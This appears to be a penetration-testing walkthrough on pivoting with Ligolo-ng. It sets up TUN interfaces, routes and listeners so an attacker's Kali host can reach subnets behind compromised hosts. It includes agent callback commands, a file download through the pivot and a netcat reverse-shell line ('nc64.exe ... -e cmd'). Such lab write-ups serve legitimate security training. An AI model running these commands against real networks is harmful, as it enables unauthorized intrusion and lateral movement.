**Overview:**
 
Ligolo-ng is a tunneling/pivoting tool that gives **routable access** to networks behind a compromised host, without proxychains. It has two parts:

- **Proxy**: runs on the Kali host. This is the server that agents connect back to, and where tunnels/routes are controlled from an interactive console.
- **Agent**: a small binary dropped on the compromised target. It connects back to the proxy and acts as the relay for traffic.

Instead of SOCKS-proxying each tool individually, Ligolo creates a **TUN interface** on the Kali machine (e.g. `tunnel1`). Once a route is added on Kali pointing a target subnet at that TUN interface, the traffic is transparently encapsulated, sent through the agent, and executed into the real network on the other side so `nmap`, `netexec`, `smbclient`, can be run **natively**, like the Kali host is sitting on that subnet.

Each pivot is a separate layer, and each layer gets its **own TUN interface and its own route** on Kali:

```
Kali (10.10.14.14) TUN0 
   │
   │  agent1 connects back to 10.10.14.14:11601
   ▼
Target 1 (dual-homed foothold)
   External IP: 10.10.10.5   ← reachable from Kali via TUN0
   Internal IP: 172.16.5.10  ← reachable only from Target 1 itself
   │
   │  route added: 172.16.5.0/24 dev tunnel1  (Layer 1)
   │
   │  agent2 (on Target 2) connects back to Target 1's internal IP
   │  because Target 1 is now acting as a relay for that subnet
   ▼
Target 2 (second pivot)
   External/reachable IP: 172.16.5.20 (reachable via tunnel1)
   Internal IP: 172.16.6.15 deeper subnet, invisible from Kali directly
   │
   │  route added: 172.16.6.0/24 dev tunnel2  (Layer 2)
   ▼
Subnet only Target 2 can see
```

**Layer 1** = direct pivot (Kali ↔ Target 1's internal network).   
**Layer 2** = a pivot-through-a-pivot (Kali → tunnel1 → Target 1 → Target 2's internal network via tunnel2). 
Each new layer needs: a new TUN device, a new agent connecting to the _previous hop's_ reachable IP (not directly to Kali), a `start --tun` in the proxy console, and a new `ip route add` on Kali. Traffic for the deepest subnet transparently rides through every TUN interface stacked on top of it.

---

## 1st Pivot on 1st internal range

**1. Create and bring up `tunnel1` on Kali**

```bash
sudo ip tuntap add user root mode tun tunnel1
sudo ip link set tunnel1 up
```

Creates the virtual network interface Ligolo will route traffic through for this pivot.

**2. Start the Ligolo proxy server on Kali**

```bash
sudo ligolo-proxy -selfcert
```

Launches the Ligolo C2-style console and listens for incoming agent connections (self-signed TLS).

**3. Run the agent on Target 1, connecting back to Kali's TUN0 IP**

>**Windows**

```powershell
.\agent.exe -connect 10.10.14.14:11601 -ignore-cert
```

>**Linux**

```bash
./agent -connect 10.10.14.14:11601 -ignore-cert
```

The agent phones home to the proxy over the VPN-reachable external IP, establishing Layer 1.

**4. In the proxy console, select the agent and bind it to `tunnel1`**

```
start --tun tunnel1
```

Attaches the live agent session to the local TUN interface, making the tunnel active.

**5. Route Target 1's internal subnet through `tunnel1` (new Kali terminal)**

```bash
sudo ip route add 172.16.5.0/24 dev tunnel1
```

Tells Kali's kernel: any traffic for `172.16.5.0/24` should go out via `tunnel1` (and therefore through the agent on Target 1).

**6. Add a listener on `tunnel1`**

```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```

Opens a listening port **inside** Target 1's network (reachable from hosts in `172.16.5.0/24`) and forwards connections back to the local proxy port. This is what lets a second agent (deeper in the network) dial back in.

**7. Verify reachability**

```bash
netexec smb 172.16.5.0/24
```

Confirms route/tunnel works by sweeping SMB across the newly reachable subnet.

---

## 2nd Pivot on 2nd internal range

**1. Create and bring up `tunnel2` on Kali**

```bash
sudo ip tuntap add user root mode tun tunnel2
sudo ip link set tunnel2 up
```

A second, separate TUN interface.

**2. Run the agent on Target 2, connecting to Target 1's internal IP (not Kali directly)**

```powershell
.\agent.exe -connect 172.16.5.10:11601 -ignore-cert
```

Target 2 can't reach Kali directly, it can only reach Target 1, so it dials the listener opened in step 6 above, which proxies the connection back to your Ligolo console.

**3. In the proxy console, select the new agent session and bind it to `tunnel2`**

```
start --tun tunnel2
```

Make sure to select the correct (new) session before running this. This activates Layer 2.

**4. Route Target 2's internal subnet through `tunnel2`**

```bash
sudo ip route add 172.16.6.0/24 dev tunnel2
```

Now traffic for `172.16.6.0/24` is sent through Layer 2 (which itself rides on top of Layer 1).

**5. Add listeners for commonly-whitelisted ports (port forwarding step)**

```
listener_add --addr 0.0.0.0:443 --to 127.0.0.1:443 --tcp
listener_add --addr 0.0.0.0:80 --to 127.0.0.1:80 --tcp
```

Opens 443/80 on the Target 2 side of the tunnel and forwards them back to the matching local port on Kali, useful for catching callbacks or serving files, since 80/443 are often allowed through firewalls/AV.

**6. Pull a file from Kali through Target 1's internal IP**

```powershell
wget http://172.16.5.10/file -outfile file
```

Target 2 requests the file from Target 1's internal IP; the listener on `tunnel1` forwards it back to whatever you're hosting on Kali (e.g. `python3 -m http.server`).

**7. Catch a reverse shell from Target 2**

```powershell
nc64.exe 172.16.5.10 443 -e cmd
```

Target 2 calls back to Target 1's internal IP on a whitelisted port; the listener relays it to your local `nc` listener on Kali.

**8. Verify reachability on the second subnet**

```bash
netexec smb 172.16.6.0/24
```

Confirms Layer 2 is working end-to-end.

---

## Local Port Forwarding to Kali

This is used when only one internal-only service/port (e.g. an internal web app) needs to be reachable directly from a Kali tool or Firefox.

**1. Create a dedicated TUN interface**

```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
```

**2. Connect the agent to your proxy (TUN0 IP)**

```powershell
.\agent.exe -connect 10.10.14.14:11601 -ignore-cert
```

**3. In the proxy console, bind the session to `ligolo`**

```
start --tun ligolo
```

**4. Add the route**

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
```

`240.0.0.1` is a special Ligolo address representing "the agent's localhost." Any port the agent can reach on `127.0.0.1` (its own loopback) becomes reachable from Kali at `240.0.0.1`, with no proxychains required.

**5. Verify with Nmap**

```bash
nmap -p- 240.0.0.1
```